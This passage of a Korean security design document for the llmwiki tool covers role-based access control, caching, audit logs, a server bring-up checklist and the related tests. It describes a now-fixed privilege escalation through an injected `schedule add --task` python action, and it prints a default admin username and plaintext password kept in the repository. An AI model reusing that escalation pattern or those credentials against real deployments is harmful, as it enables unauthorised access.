| 재생 경로 | 저장된 컨텍스트에도 | `query_engine._replay_retrieval` 에 `doc_acl` 단계. 근거가 빠지면 저장본을 쓰지 않고 **다시 조립**한다 |
| 캐시 | 키에 **가시성 등급** | `Pipeline.visibility_key()` 가 `_cache_key`·`answer_signature` 에 들어간다. 캐시가 맞으면 `doc_acl` 은 실행되지 않으므로 키에 없으면 접근 제어가 캐시 하나로 무너진다. 사용자별이 아니라 **역할별**로 나눈다(적중률 유지) |
| 지난 요청 열람 | 다섯 경로 모두 | `_not_my_request()` — `/api/request` · `/api/rerun` · `/api/query/rerun` · `/api/query_trace` · `/api/analysis`. `request_id` 는 순차 정수라 **열거**가 가능하다 |

### CLI 등급표의 기본값 — 모르는 명령은 admin

`classify_cli` 의 fallback 이 `edit`(class2)이었고 `schedule` 이 어느 표에도 없었다. `POST /api/schedule` 은
admin 인데, **Web 콘솔**(`/api/cli`)이 이 표를 쓰고 `run_captured` 가 `gate=False` 로 실행하므로
`schedule add --task '{…"action":{"type":"python"…}}'` 한 번으로 class2 가 서버 프로세스 권한 임의 실행에 이르렀다.

지금은 표에 없는 명령이 **admin** 으로 떨어진다. 새 CLI 명령을 추가하면 `auth.py` 의 등급표에 적어야 하고,
적지 않으면 admin 만 쓸 수 있다 — 조용히 낮은 등급으로 열리는 것보다 낫다.
개별 조정은 코드가 아니라 `security perms set 'cli:<명령> <액션>=<역할>'` 로 한다.

고정: `tests/test_privilege_paths.py`(20항목) — 함수가 아니라 **경로**를 센다.
상세와 남은 항목: [QA_HARDENING_0919.md §9](history/2026-09-19/QA_HARDENING_0919.md) · [CODEBASE_REVIEW_0919.md](history/2026-09-19/CODEBASE_REVIEW_0919.md).

## 7. 감사 로그

`logs/audit.jsonl` 한 줄 = `{time, user, role, via(local|sso|apikey|anon|cli|off), ip, op, level, ok, detail, error}`. 기록 대상: 로그인/로그아웃(성공·실패), `read` 를 제외한 모든 작업(성공), 모든 거부(401/403, CLI 게이트, MCP 인증 실패). 비밀번호·시크릿·토큰 값은 `***` 로 가린다. 보기: `python -m llmwiki security audit --n 100`, Web › Settings › 보안 탭, `GET /api/audit`(admin).

## 8. 서버 공개 절차 (bring-up 체크리스트)

1. `security.json` 확인 — 이 저장소에는 admin `kh82.kim / 1234qwer` 가 들어 있다. **공개 전에 반드시** `python -m llmwiki users passwd kh82.kim` 으로 바꾸고, 필요한 사용자를 `users add <id> --role <역할>` 로 추가한다. 새 환경에서 깨끗이 시작하려면 `setup/security.example.json`(users 비어 있음, 키마다 `_how` 설명) 을 `security.json` 으로 복사하고 admin 을 만든다 — `install.bat/.sh` 가 파일이 없을 때 자동으로 복사하며, `setup/check_env.py` 가 admin 수·기본 admin 잔존·익명 역할·API 키 수를 보고한다.
2. 익명 접속을 허용할지 결정: 사내망 전용이면 `anonymous_role: "viewer"`(기본), 아니면 `""`.
3. SSO 를 쓰면 §4.2/4.3 항목을 채우고 `.env` 에 `LLMWIKI_OIDC_CLIENT_SECRET=`. 그룹 → 역할은 `role_map`.
4. 권한 표 조정(선택): `security perms set …` 또는 Web 보안 탭. 예) eval 을 viewer 에게 열기 `run=viewer`.
5. MCP 로 외부 LLM 을 붙이면 `apikey add <이름> --role viewer` 로 키를 발급해 준다 ([MCP.md](MCP.md)).
5.1. 등급이 다른 문서가 섞여 있으면 **문서 접근 제어**를 켠다(§6.2): `setup/docacl.example.json` 을 `docacl.json` 으로 복사해 `rules` 를 채우고, **저장 전에** `security docacl check --role viewer` 로 몇 건이 가려지는지 확인한다. 규칙을 비워 두면 아무도 막지 않으므로 지금 정하지 않아도 나중에 켤 수 있다.
6. `python -m llmwiki serve` — 2026-09-18 부터 `config.json web_host` 기본값이 **`0.0.0.0`** 이라 플래그 없이도 외부에서 접속된다(`security.mode=auto` 는 비-루프백 바인드에서 로그인을 켠다). 사용자·API 키·SSO 가 없고 익명도 꺼져 있으면 서버가 **기동을 거부**한다(`--insecure` 로 강제 가능하나 권장하지 않음). 이 PC 에서만 쓰려면 `config set web_host=127.0.0.1`. 요청 단위 overrides 화이트리스트와 500 마스킹(§6.1)은 기본으로 켜져 있다.
7. HTTPS: 서버는 HTTP 만 말하므로 **리버스 프록시(nginx/IIS/사내 게이트웨이)** 뒤에 두고 TLS 종료 + `X-Forwarded-Proto: https` 를 넘기면 쿠키에 Secure 가 붙는다. 프록시에서 IP 별 rate limit 을 걸면 로그인 무차별 대입도 막힌다.
8. 확인: `security show`, `security perms`; 다른 브라우저에서 게스트로 질의가 되는지, viewer 계정이 빌드 버튼에서 403/로그인 안내를 받는지, builder 가 채널 리빌드에서 문구 모달을 보는지, `security audit` 에 남는지.
9. 운영: 퇴사/이동은 `users remove` / `apikey remove` 또는 IdP 그룹 정리. 정책 변경은 `security.json` 수정 후 Web 보안 탭 "다시 읽기"(또는 서버 재시작).

## 8.1 "보안 · 사용자 화면의 버튼이 안 먹는다" 할 때 볼 것

이 화면의 기능은 거의 다 `admin` 전용이다. 안 되는 것처럼 보이는 경우는 대부분 **권한**이거나
**입력**이지 배선 문제가 아니다 (전수 확인: `python tools\verify\verify_security_ui.py` — 46항목).

| 증상 | 원인 | 확인·해결 |
|---|---|---|
| 사용자 목록 자리에 "admin 만 볼 수 있습니다" 가 뜨고 추가 폼이 없다 | 지금 접속이 admin 이 아니다. `mode:"auto"` 는 **127.0.0.1 에서만** 인증을 끄므로, **다른 PC 에서 접속하면 익명(viewer)** 이 된다 | 화면에 현재 역할·접속 방식이 함께 표시된다. admin 계정으로 로그인하거나, 사내 배포라면 `mode:"on"` 으로 두고 계정을 발급한다 |
| **추가** 를 눌러도 아무 반응이 없다 | id 칸이 비어 있다 | 안내가 뜬다. id 는 공백·`/ \ " ' < >` 를 쓸 수 없다 |
| 비밀번호를 넣으면 거절된다 | `local.min_password_len`(기본 8) 미만 | 입력칸 placeholder 에 최소 길이가 표시된다. **비우면 SSO 전용 계정**으로 만들어진다 |
| **발급** 을 눌렀는데 키 목록이 그대로다 | (고침) 예전에는 표를 다시 그리지 않았다 | 이제 발급 즉시 표에 나타난다. 토큰은 **그때 한 번만** 보이므로 그 자리에서 복사한다 |
| 변경 때마다 확인 모달이 뜬다 | `mode:"on"` + `warn.confirm: true` 의 정상 동작 | 모달에서 "진행". 리빌드/파괴적 작업은 문구 + 비밀번호까지 (§6) |

## 9. 한계와 다음 단계

- **SSO 사용자의 재인증**: 현재 문구만 요구한다. IdP 가 `prompt=login`/`max_age` 를 지원하면 리빌드 직전에 SSO 재인증을 강제하는 옵션을 추가할 수 있다.
- **세션 즉시 폐기**: 서명 쿠키라 개별 세션을 서버에서 지우는 목록이 없다. `data/.session_secret` 삭제 = 전원 로그아웃. API 키는 `apikey remove` 로 즉시 무효.
- **2단계 승인(4-eyes)**: 전체 초기화에 두 번째 admin 의 승인을 요구하는 방식은 `destructive.require_second_admin` 로 확장 가능.
- **HTTPS 자체 종료**는 넣지 않았다(인증서 관리는 프록시가 맞다).
- **rate limit**: API 키별 호출 제한은 없다. 외부 LLM 이 많으면 프록시에서 키/IP 별 제한을 건다.

## 10. 구현 파일

| 파일 | 내용 |
|---|---|
| `llmwiki/auth.py` | 역할(ROLES/RANK/별칭)·등급(LEVELS/LEVEL_CONFIRM)·`permissions`(min_role/set_permission)·API 키(발급/검증)·익명·비밀번호 해시·서명 세션·작업 분류표(`classify_api/classify_cli`)·`Auth.authorize()`·로컬 로그인·헤더 SSO·OIDC·감사 로그·CLI 게이트(`cli_actor/cli_min_role`) |
| `llmwiki/snapshots.py` | 스냅샷 생성/목록/복원/정리 |
| `llmwiki/web/server.py` | 요청마다 identify → authorize → 실행 → audit. `/login`, `/api/auth/*`, `/auth/sso/*`, `/api/audit`, `/api/security`(reload/set_permissions/set_permission/set_anonymous/set_cli), `/api/apikeys`, `/api/snapshot`, `/mcp`(Bearer). `serve()` 기동 시 보안 상태 검사 |
| `llmwiki/web/static/login.html` | 로그인 화면(ID/PW + SSO 버튼 + 게스트 링크) |
| `llmwiki/web/static/js/core.js` | `api()` 의 401/403/428 처리(게스트 안내 포함), 단계 확인 모달(`stepUp`), 헤더 사용자/게스트 배지 |
| `llmwiki/web/static/js/settings.js` | 보안 탭: 역할 설명·사용자·권한 표·API 키·스냅샷·감사 로그 |
| `llmwiki/docacl.py` | 문서 단위 접근 제어(§6.2): 규칙 로딩·`min_role_for`(경로 규칙 vs front matter 중 높은 쪽)·`can_see`·요청 단위 `Filter`(문서당 1회 판정 캐시)·`describe`/`check`(영향 미리보기) |
| `llmwiki/ctxguard.py` | 프롬프트 인젝션 방어: 컨텍스트 본문의 구획·역할·인용 흉내 조각 무력화, 펜스(`<<<C1>>>`) 조립, `injection_marks` 관측 |
| `llmwiki/mcp.py` | `safe_overrides()` — 도구 인자의 overrides 를 호출자 역할로 거른다(§6.3). `/mcp` 핸들러가 넘긴 `actor` 로 `wiki_query`·`wiki_search`·`wiki_doc`·`wiki_related` 가 문서 접근 제어를 받는다 |
| `llmwiki/cli.py` | `--user/--password` 전역 옵션, `_cli_gate`, `users`, `security show|init|audit|perms|docacl`, `apikey`, `snapshot`, 파괴적/리빌드 명령의 확인 문구/`--yes` |
| `llmwiki/pipeline.py` | `reset_index` 락 + 자동 스냅샷 |
| `tests/test_privilege_paths.py` | **경로** 20항목(§6.3): overrides 위험 키가 모든 역할에서 거부되는가 · Web·MCP 가 같은 필터를 부르는가 · CLI 서브커맨드가 전부 등급표에 있는가(빠지면 admin) · 질의를 실행하는 길이 전부 신분을 받는가 · 재생 경로의 `doc_acl` · 캐시 구획 |
| `tests/test_doc_acl.py` | 문서 접근 제어 24항목: 규칙 해석(경로 vs front matter, 목록, 오타, 화이트리스트 모드, Windows 경로) · `Filter` 캐시·보고 · 네 출구(답변 근거·채널 검색·문서 열람·후보 목록) · **MCP 도구(`wiki_search`·`wiki_doc`·`wiki_related`)가 호출자 역할을 받는가** · 대조군(admin 은 같은 질의에서 찾는다) · 영향 미리보기 · 토글 해제 |
| `tests/test_prompt_injection.py` | 인젝션 방어 15항목: 공격 코퍼스 12종(지시 탈취·구획 위조·인용 위조) 무력화 · 본문 보존 · 시스템 프롬프트의 데이터/지시 경계 규칙 · 관측 가능성 |
| `tests/test_auth.py` | 분류표(7등급) · 해시/서명 · 역할/확인/문구/재인증 · permissions 오버라이드 · 익명 · API 키 · 헤더 SSO · OIDC(가짜 IdP) · Web 통합(로그인→428→승인→스냅샷→감사→권한 표 편집→API 키 질의) · CLI 게이트(viewer 거부, --user 승격, perms/apikey CLI) |
| `tests/test_features_0914.py` (McpHttpTest) | MCP HTTP 의 Bearer/쿠키/익명 인증, 감사 로그 |
